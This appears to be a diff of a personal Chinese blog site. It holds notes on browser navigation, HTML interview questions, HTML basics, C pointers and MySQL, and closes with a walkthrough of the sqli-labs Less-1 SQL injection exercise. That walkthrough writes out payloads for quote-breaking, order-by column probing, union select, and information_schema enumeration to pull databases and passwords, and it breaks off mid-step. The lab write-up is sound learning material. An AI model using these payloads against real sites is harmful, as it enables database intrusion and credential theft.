+<li>导航会通过请求头的<strong>Content-type</strong>字段判断响应体数据的类型。浏览器通过这个来决定如何显示响应体的内容。比如：若为application/octet-stream，则会按照下载类型来处理这个请求，导航结束。若为text/html，这就告诉浏览器服务器返回的是html格式，浏览器会通知渲染进程，你要干活了。</li>
+</ul>
+<ol>
+<li>准备渲染进程</li>
+</ol>
+<ul>
+<li>默认情况，每个页面一个渲染进程。但若处于<strong>同一站点</strong>（同根域名+协议），那么渲染进程就会复用。</li>
+</ul>
+<ol>
+<li>提交文档</li>
+</ol>
+<ul>
+<li>渲染进程准备好后，浏览器进程发出**“<strong><strong>提交文档的消息</strong></strong>”**，渲染进程接受了消息之后，会跟网络进程简历传输数据的管道。</li>
+<li>等数据传输完成了，渲染进程会告诉浏览器进程，<strong>确认文档提交</strong>，这时候浏览器会更新页面，安全状态，url，前进后退的历史。</li>
+<li>到这里导航结束，进入渲染阶段。</li>
+</ul>
+<p>注：当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为百度首页的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>
+<p><strong>前端<strong><strong>HTML</strong></strong>基础面试题</strong></p>
+<p><strong>iframe****有哪些缺点？</strong></p>
+<p>iframe是一种框架，也是一种很常见的网页嵌入方式。</p>
+<p><strong>「<strong><strong>iframe</strong></strong>的优点」</strong></p>
+<ul>
+<li>iframe能够原封不动的把嵌入的网页展现出来。</li>
+<li>如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。</li>
+<li>网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。</li>
+<li>如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。</li>
+</ul>
+<p><strong>「<strong><strong>iframe</strong></strong>的缺点」</strong></p>
+<ul>
+<li>会产生很多页面，不容易管理。</li>
+<li>iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。</li>
+<li>代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。</li>
+<li>很多的移动设备（PDA 手机）无法完全显示框架，设备兼容性差。</li>
+<li>iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。</li>
+<li>现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。</li>
+</ul>
+<p><strong>label****的作用是什么？是怎么用的？</strong></p>
+<p>例子1: 点击&quot; 用户名:&quot; 就可以定位光标到输入框</p>
+<form><label for="myid "> 用户名:</label>
+ <input type="text" id="myid" /></form> 
+<p>例子2: 点击&quot; 用户名:&quot; 或按键alt+1, 都可以定位光标到输入框</p>
+<form>
+   <label for="myid" accesskey="1"> 用户名:</label>
+   <input type="text" id="myid" tabindex="1" />
+ </form> 
+<p><strong>for</strong> <strong>属性</strong>功能：表示Label 标签要绑定的HTML 元素，你点击这个标签的时候，所绑定的元素将获取焦点。</p>
+<p><strong>acesskey</strong> <strong>属性</strong><br>
+**功能：**表示访问Label 标签所绑定的元素的热键，当您按下热键，所绑定的元素将获取焦点。<br>
+**局限性：**accessKey 属性所设置的快捷键不能与浏览器的快捷键冲突，否则将优先激活浏览器的快捷键。</p>
+<p><strong>HTML5<strong><strong>的</strong></strong>form****如何关闭自动完成功能？</strong></p>
+<p>HTML的输入框可以拥有自动完成的功能，当你往输入框输入内容的时候，浏览器会从你以前的同名输入框的历史记录中查找出类似的内容并列在输入框下面，这样就不用全部输入进去了，直接选择列表中的项目就可以了。<br>
+但有时候我们希望关闭输入框的自动完成功能，例如当用户输入内容的时候，我们希望使用AJAX技术从数据库搜索并列举而不是在用户的历史记录中搜索。</p>
+<p><strong>关闭输入框的自动完成功能有<strong><strong>3</strong></strong>种方法：</strong></p>
+<ol>
+<li>在IE的Internet选项菜单里的内容–自动完成里面设置</li>
+<li>设置form的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭自动完成功能</li>
+<li>设置输入框的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭该输入框的自动完成功能</li>
+</ol>
+<p><strong>将</strong> <strong>HTML5</strong> <strong>看作成开放的网络平台</strong></p>
+<p><strong>「什么是</strong> <strong>HTML5</strong> <strong>的基本构件（<strong><strong>building block</strong></strong>）？」</strong></p>
+<ol>
+<li>语义 - 提供更准确地描述内容。</li>
+<li>连接 - 提供新的方式与服务器通信。</li>
+<li>离线和存储 - 允许网页在本地存储数据并有效地离线运行。</li>
+<li>多媒体 - 在 Open Web 中，视频和音频被视为一等公民（first-class citizens）。</li>
+<li>2D/3D 图形和特效 - 提供更多种演示选项。</li>
+<li>性能和集成 - 提供更快的访问速度和性能更好的计算机硬件。</li>
+<li>设备访问 - 允许使用各种输入、输出设备。</li>
+<li>外观 - 可以开发丰富的主题。</li>
+</ol>
+<p><strong>浏览器是怎么对<strong><strong>HTML5</strong></strong>的离线储存资源进行管理和加载的呢？</strong></p>
+<p>在浏览器的html头部加上manifest属性，如果是第一次访问浏览器会根据manifest的内容进行下载存储离线内容，如果已经访问过则从离线存储中进行加载，然后在比对服务器如果有新内容在更新离线存储<br>
+离线的情况下，浏览器就直接使用离线存储的资源。</p>
+<p><strong>浏览器的渲染过程？</strong></p>
+<p>1、将获取的html解析成dom树<br>
+2、处理css，构成层叠样式表模型CSSOM<br>
+3、将dom树和CSSOM合并为渲染树<br>
+4、根据CSSOM将渲染树的节点布局计算<br>
+5、将渲染树节点样式绘制到页面上</p>
+<p>// 注意<br>
+在渲染的过程中是自上而下渲染，<br>
+js会阻塞页面的渲染，优先等js执行完成<br>
+如果在渲染的过程中改变了样式，会造成回流需要重新渲染</p>
+<p><strong>link<strong><strong>和</strong></strong>@import****的区别？</strong></p>
+<p>1、从属关系区别：<br>
+link属于html标签，而@import是css提供的。<br>
+2、加载顺序区别：<br>
+页面被加载时，link会同时被加载，而@import引用的css会等到页面被加载完再加载。<br>
+3、兼容性区别：<br>
+import只在IE5以上才能识别，而link是html标签，无兼容问题。<br>
+4、dom可操作性区别：<br>
+可以通过JS 操作 DOM ，插入link标签来改变样式；由于 DOM 方法是基于文档的，无法使用@import的方式插入样式<br>
+5、权重区别：<br>
+如果已经存在相同样式，@import引入的这个样式将被该 CSS 文件本身的样式层叠掉，表现出link方式的样式权重高于@import的权重这样的直观效果。<br>
+（简而言之，link和@import，谁写在后面，谁的样式就被应用，后面的样式覆盖前面的样式。）</p>
+<p><strong>src<strong><strong>与</strong></strong>href****的区别？</strong></p>
+<p>1、href 是指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，用于超链接。<br>
+2、src是指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将</p>
+<ul>
+<li>
+<p><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</p>
+</li>
+<li>
+<p><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</p>
+</li>
+<li>
+<p><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</p>
+</li>
+<li>
+<p><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</p>
+</li>
+<li>
+<p><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</p>
+</li>
+<li>
+<p><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</p>
+</li>
+<li>
+<p><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</p>
+</li>
+<li>
+<p><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</p>
+</li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/28/Typor%E7%9A%84%E4%BD%BF%E7%94%A8/" data-id="cl1a5wq3j0006ugtdhtb3aarr" data-title="Typor的使用" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/28/Typor%E7%9A%84%E4%BD%BF%E7%94%A8/" data-id="cl1dk77jp000844tdfrmx04mm" data-title="Typor的使用" class="article-share-link">Share</a>
       
       
       
@@ -141,52 +3215,53 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>学习结束后学会制作一个静态网站，看见其他网页布局，要能看得懂</p>
-<h5 id="iefans"><a href="#iefans" class="headerlink" title="iefans"></a>iefans</h5><p>[TOC]</p>
-<h1 id="HTML5相关内容"><a href="#HTML5相关内容" class="headerlink" title="HTML5相关内容"></a>HTML5相关内容</h1><h3 id="什么是网页："><a href="#什么是网页：" class="headerlink" title="什么是网页："></a>什么是网页：</h3><p>网站是什么：就是平时我们所点击的看的就是网站，它是使用HTML等来制作的</p>
+<h5 id="iefans">iefans</h5>
+<p>[TOC]</p>
+<h1>HTML5相关内容</h1>
+<h3 id="什么是网页：">什么是网页：</h3>
+<p>网站是什么：就是平时我们所点击的看的就是网站，它是使用HTML等来制作的</p>
 <p>网页是什么：是网站中的一页，通常是HTML格式文件，它要通过浏览器来阅读；网页是构成网站的基本元素，一个网页里面会有图片，文字，视频，声音等等；通常我们看见的网页以.htm或者.html后缀结尾的文件，叫其为html文件。</p>
-<h3 id="什么是HTML："><a href="#什么是HTML：" class="headerlink" title="什么是HTML："></a><strong>什么是HTML：</strong></h3><p>叫做超文本标记语言，是用来描述网页的一种语言，不是编程语言，只是一种标记语言。专门用来创造网页，文字有文字标签，图片有图片标签。</p>
-<p>这里你可以尝试自己用文档写一个图片网页，在文档里面添加这样一个东西——<img src="这里去复制一张图片的名字">    然后把文档后缀名改成html  就可以了，退出重新进入你就成功制作了一个最简单的网页，只有一张图片的网页。</p>
+<h3 id="什么是HTML："><strong>什么是HTML：</strong></h3>
+<p>叫做超文本标记语言，是用来描述网页的一种语言，不是编程语言，只是一种标记语言。专门用来创造网页，文字有文字标签，图片有图片标签。</p>
+<p>这里你可以尝试自己用文档写一个图片网页，在文档里面添加这样一个东西------<img src="这里去复制一张图片的名字">    然后把文档后缀名改成html  就可以了，退出重新进入你就成功制作了一个最简单的网页，只有一张图片的网页。</p>
 <p>这里在再解释一下HTML：1.（它超越了文本限制）可以加入图片，声音、动画、、、、、   2.（超链接文本）可以从一个文件跳到另外一个文件。这样解释，有点意思</p>
-<p>网页：前端人员开发代码—-&gt;浏览器显示代码（解析、渲染）—–&gt;生成最后的web 页面</p>
-<h3 id="浏览器："><a href="#浏览器：" class="headerlink" title="浏览器："></a>浏览器：</h3><p>浏览器是网页显示、运行的平台       浏览器内核（渲染引擎）：负责读取我们所写的网页内容，整理讯息，计算网页的显示方式并显示页面</p>
-<h3 id="web标准"><a href="#web标准" class="headerlink" title="web标准"></a>web标准</h3><p>遵循web标准除了可以让不同的开发人员写出的网页更加标准，更统一，还有一些优点，直接百度去查看就好了。</p>
-<p><strong>web标准（很重要）</strong>：主要包括1.结构（也就是HTML），2.表现(主要是指css)：所以可以知道：CSS是用于设置网页元素的板式、颜色、大小的外观形状的样式，3.行为（就是JAVASCRPT）：这里也可以知道，行为是指网页模型的定义及交互的编写，动态的，可以有选择的东西——这三个东西都要学</p>
-<h3 id="HTML语法规范："><a href="#HTML语法规范：" class="headerlink" title="HTML语法规范："></a>HTML语法规范：</h3><p>大部分的标签都是成对出现，并且包含在&lt;&gt;里面：比如<html></html>，有些特殊单标签：1.<br /></p>
-<h3 id="包含标签有两类："><a href="#包含标签有两类：" class="headerlink" title="包含标签有两类："></a>包含标签有两类：</h3><p>包含关系：eg；</p>
+<p>网页：前端人员开发代码----&gt;浏览器显示代码（解析、渲染）-----&gt;生成最后的web 页面</p>
+<h3 id="浏览器：">浏览器：</h3>
+<p>浏览器是网页显示、运行的平台       浏览器内核（渲染引擎）：负责读取我们所写的网页内容，整理讯息，计算网页的显示方式并显示页面</p>
+<h3 id="web标准">web标准</h3>
+<p>遵循web标准除了可以让不同的开发人员写出的网页更加标准，更统一，还有一些优点，直接百度去查看就好了。</p>
+<p><strong>web标准（很重要）</strong>：主要包括1.结构（也就是HTML），2.表现(主要是指css)：所以可以知道：CSS是用于设置网页元素的板式、颜色、大小的外观形状的样式，3.行为（就是JAVASCRPT）：这里也可以知道，行为是指网页模型的定义及交互的编写，动态的，可以有选择的东西------这三个东西都要学</p>
+<h3 id="HTML语法规范：">HTML语法规范：</h3>
+<p>大部分的标签都是成对出现，并且包含在&lt;&gt;里面：比如<html></html>，有些特殊单标签：1.<br /></p>
+<h3 id="包含标签有两类：">包含标签有两类：</h3>
+<p>包含关系：eg；</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>并列关系 eg：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="HTML的基本结构标签："><a href="#HTML的基本结构标签：" class="headerlink" title="HTML的基本结构标签："></a>HTML的基本结构标签：</h3><p>基本的，每个网页都要</p>
+<h3 id="HTML的基本结构标签：">HTML的基本结构标签：</h3>
+<p>基本的，每个网页都要</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>    //html标签页面中最大的标签，叫根标签</span><br><span class="line">     <span class="tag">&lt;<span class="name">head</span>&gt;</span>     //文档的头部，注意在head标签中我们必须要设置的标签是title</span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>w我的第一个页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span>    //文档的标题，让网页拥有一个属于自己的网页标题</span><br><span class="line">     <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">body</span>&gt;</span>   //文档的主体，元素包含文档的所有内容，页面内容都是放到<span class="tag">&lt;<span class="name">body</span>&gt;</span>里面的</span><br><span class="line">          你我之间，一飞冲天</span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开发工具："><a href="#开发工具：" class="headerlink" title="开发工具："></a>开发工具：</h3><p>任何一种都差不多这里介绍一下如何创建VSCODE的下载及使用：点击这个连接下载：<a href="https://link.zhihu.com/?target=https://code.visualstudio.com/download">https://link.zhihu.com/?target=https%3A//code.visualstudio.com/download</a>        如何选择和自己电脑匹配的即可，我先开始在软件商店下载后不能保存文件，我找不到原因，后来到网站上看了看，跟着做就OK了。</p>
+<h3 id="开发工具：">开发工具：</h3>
+<p>任何一种都差不多这里介绍一下如何创建VSCODE的下载及使用：点击这个连接下载：<a href="https://link.zhihu.com/?target=https%3A//code.visualstudio.com/download">https://link.zhihu.com/?target=https%3A//code.visualstudio.com/download</a>        如何选择和自己电脑匹配的即可，我先开始在软件商店下载后不能保存文件，我找不到原因，后来到网站上看了看，跟着做就OK了。</p>
 <p>一些快捷键：ctrl+加号键放大页面，加减号键缩小页面；Ctrl+N:新建一个文件夹；Ctrl+S保存文件</p>
-<h3 id="以下对HTML基本标签做一个解释"><a href="#以下对HTML基本标签做一个解释" class="headerlink" title="以下对HTML基本标签做一个解释"></a>以下对HTML基本标签做一个解释</h3><!DOCTYPE html><p>  //这是文档的声明的标签，不是说是HTML的标签，这句代码必须在代码最前面</p>
-<html lang="zh-CN">    //lang="en":意思是当前的文档语言类型==="en"定义语言为英文     ==="zh-CN"定义语言为中文（但是这两个其实不管写那个文档内容都可以用中文和英文来写）
-<head>
-    <meta charset="UTF-8">   //character set是字符集的意思，是多个字符的集合，以便计算机可以识别和存储各种文字；UTF-8叫万国码，基本不会出现乱码的情况，必须写，
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>我利用VSCODE创建的第一个文件</title>
-</head>
-<body>
-    写代码是一件很快乐的事情
-    <textarea name="" id="" cols="30" rows="10"></textarea>
-</body>
-</html>
-### 标签的语义：
-
-<p>记住每个标签的语义，在合适的地方给一个最合理的标签</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标签》<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>    共有六个，从<span class="tag">&lt;<span class="name">h1</span>&gt;</span>---<span class="tag">&lt;<span class="name">h6</span>&gt;</span>    为什么是h,因为是单词head的缩写，意为头部，标题的意思</span><br></pre></td></tr></table></figure>
-
-<p>看到P14</p>
+<h3 id="以下对HTML基本标签做一个解释">以下对HTML基本标签做一个解释</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span>  //这是文档的声明的标签，不是说是HTML的标签，这句代码必须在代码最前面</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span>    //lang=&quot;en&quot;:意思是当前的文档语言类型===&quot;en&quot;定义语言为英文     ===&quot;zh-CN&quot;定义语言为中文（但是这两个其实不管写那个文档内容都可以用中文和英文来写）</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>   //character set是字符集的意思，是多个字符的集合，以便计算机可以识别和存储各种文字；UTF-8叫万国码，基本不会出现乱码的情况，必须写，</span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>我利用VSCODE创建的第一个文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    写代码是一件很快乐的事情</span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="记住每个标签的语义，在合适的地方给一个最合理的标签">记住每个标签的语义，在合适的地方给一个最合理的标签</h2>
+<h3 id="标题标签">标题标签</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一级标签》<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>    共有六个，从<span class="tag">&lt;<span class="name">h1</span>&gt;</span>---<span class="tag">&lt;<span class="name">h6</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>1是最大的标题  为什么是h,因为是单词head的缩写，意为头部，标题的意思<br>
+特点：加了标题的文字会变粗，且一个标题占一行，字号逐渐减小，重要性也随之逐渐减小，</p>
+<h3 id="段落和换行标签">段落和换行标签</h3>
+<p>段落标签（paragraph）:把文字分成若干段</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span></span><br><span class="line">    这是段落标签</span><br><span class="line"><span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>换行标签：强制换行（只有单独的一个，无配对）braek:意为打断、换行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看到16</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/26/Html5-css3%E8%AE%B0%E5%BD%95/" data-id="cl1a5wq3h0002ugtd6u2e316r" data-title="Html5+css3记录" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/26/Html5-css3%E8%AE%B0%E5%BD%95/" data-id="cl1dk77jh000244tdfecl49zb" data-title="Html5+css3记录" class="article-share-link">Share</a>
       
       
       
@@ -223,11 +3298,10 @@
         <p><strong>指针</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.指针变量：就是存放的是一个地址，而普通变量存放的是一个值</span><br><span class="line">2.指针：知道了一个变量的地址，通过这个地址来访问这个变量，因此把变量的地址称为改变量的指针</span><br><span class="line">3.指针变量的值（就是指 指针变量中存放的值）是指针（即地址）</span><br><span class="line">4.*：叫做取值操作符；    &amp;：取址操作符</span><br><span class="line">5.P1=&amp;a</span><br><span class="line">  &amp;*P1的含义是什么？    对于&amp;和*两个运算符，其优先级是相同的，按照从右往左的方向进行结合</span><br><span class="line">  所以先运算*P1，其值为变量a,再执行&amp;的计算为&amp;a,(所以*&amp;P1==&amp;a)</span><br><span class="line">6.(*p1)++相当于a++  (指针需要加一个括号，因为++与*属于同一级别，结合方式从右向左)</span><br><span class="line">7.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/06/C%E8%AF%AD%E8%A8%80/" data-id="cl1a5wq3b0000ugtdf6ya6c5l" data-title="C语言" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/06/C%E8%AF%AD%E8%A8%80/" data-id="cl1dk77je000144tdg5fk0fxc" data-title="C语言" class="article-share-link">Share</a>
       
       
       
@@ -263,26 +3337,19 @@
       
         <p><strong>MySQL命令行</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.exit退出     mysql -u root -p登陆  然后输入密码即可</span><br><span class="line">2.show databases;显示MySQL里面所有的库</span><br><span class="line">     也可以用万能句查询：select schema_name from information_schema.schemata</span><br><span class="line">3.use test(某个库)；显示该数据库</span><br><span class="line">    然后show tables；显示该库所有的表</span><br><span class="line">         想要拿到该表中某个数据：select * from users(某个表)</span><br><span class="line">4（这个方法为MySQL高级版本所使用的）.</span><br><span class="line">  查库select schema_name from information_schema.schemata   =  show databases</span><br><span class="line">  查表select table_name from information_schema.tables where table_schema=&#x27;test&#x27;   =   use test(某个库)+show tables</span><br><span class="line">  查列(显示有哪些列)：select column_name from information_schema.columns where table_name=&#x27;users(某个表)&#x27;</span><br><span class="line">  查字段（后面用逗号分开的为上面所查列中所显示的列）（在数据库中列叫做字段）：select id,username,password from security.users  =   select * from users(某个表)</span><br><span class="line"> 5.网站sqli-labs:里面有很多值得借鉴的内容</span><br><span class="line">6.select user();=select system_user();（显示系统用户）</span><br><span class="line">7.select database();显示当前所使用的数据库；</span><br><span class="line">8.select version();显示版本信息</span><br><span class="line">9.select @@datadir;显示MySQL的安装路径</span><br><span class="line">10.select @@version_compile_os;显示当前的操作系统</span><br><span class="line">11.注意，每次开始新的一关时要先去phpstudy里面自己设置的文件夹名称里面找到关卡用</span><br><span class="line">   找到index.php用notepad++打开，然后在</span><br><span class="line">   语句————$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">   后加上：echo $sql;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;; 这行代码</span><br></pre></td></tr></table></figure>
-
 <p><strong>Less-1记录</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.打开题目显示为：Please input the ID as parameter with numeric value</span><br><span class="line">    意思是要我们输入ID进行测试</span><br><span class="line">    </span><br><span class="line">2.输入?id=1:可以拿到用户名和密码(sql语句为：ELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1 （发现该语句与上面的查字段相同） </span><br><span class="line">    将SQL语句在MySQL命令行执行，然后进行观察，将SQL语句改为（原SQL语句删掉WHERE id=&#x27;1&#x27;）SELECT * FROM users limit 0,1发现命令行内容与原SQL语句相同    然后改变0或者1的值发现    limit 0,1；其中第一位是从第几位开始，比如0为从第一位开始；而第二位的1代表的就是显示多少个数据) （如文章末尾图2）</span><br><span class="line"> 可以对id=1/2/3值进行修改，直到密码显示为：Your Password:p@ssword</span><br><span class="line"> </span><br><span class="line">3.输入?id=1&#x27; or 1=1--+ （无报错，SQL语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; or 1=1-- &#x27; LIMIT 0,1）（输入的--+或者--或者#均为SQL语句的单行注释）   （输入的or或者and   eg：A and B(AB均正确返回的值才正确)，A or B (AB有一个正确则返回正确)）</span><br><span class="line"></span><br><span class="line">4.输入为?id=1&#x27;（查看是否有注入）（加了一个’）：SQL语句为：SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1   报错，在MySQL命令行里面查询也不行，有注入漏洞</span><br><span class="line"></span><br><span class="line">5.输入为：?id=1&#x27; order by 10--+  （SQL语句为：SELECT * FROM users WHERE id=&#x27;1&#x27; order by 10-- &#x27; LIMIT 0,1,将SQL语句改为：SELECT * FROM users  order by 1/2/3/4  分别在MySQL命令行执行，发现当by 1时对第一列进行排序，by 2为对第二列进行排序,3就为对第三列排序;如文章末尾图2）  </span><br><span class="line">然后对输入的?id=1&#x27; order by 10--+中的10采用二分法进行测试，发现5不存在，3返回正常，4返回不存在，说明该数据中只有3列</span><br><span class="line"></span><br><span class="line">6.输入为?id=1&#x27; union select 1,2,3--+（由上面知道为由三列）：该语句用来看1，2,3那个数据可以用来回写；执行后发现（句子正确，但是并没有任何回写信息） 将id=1改为id=-1（因为id=1得到的是用户名和密码，将数据注释掉也就是不显示出来，让前面报错，执行后发现用户名显示为2，密码为显示为3，也就是指这两个位置有回写，可以进行利用）  回写SQL语句为：SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3-- &#x27; LIMIT 0,1    在命令行输入：select * from users limit 1,1    然后在命令行再输入：select * from users limit 1,1 union select 1,2,3    对比观察    然后在命令行再入：select *from users where id=1 union selsct 1,2,3  然后将id=1改为id=-1 对比观察   （发现只显示了123）    （如图3）</span><br><span class="line"></span><br><span class="line">7.输入：?id=-1&#x27; union  select 1,2,schema_name from information_schema.schemata--+  可以得到我们的第一个数据库（将3作为显示位置，利用MySQL高级查库进行查询）  然后在--+前面添加 limit 0,1  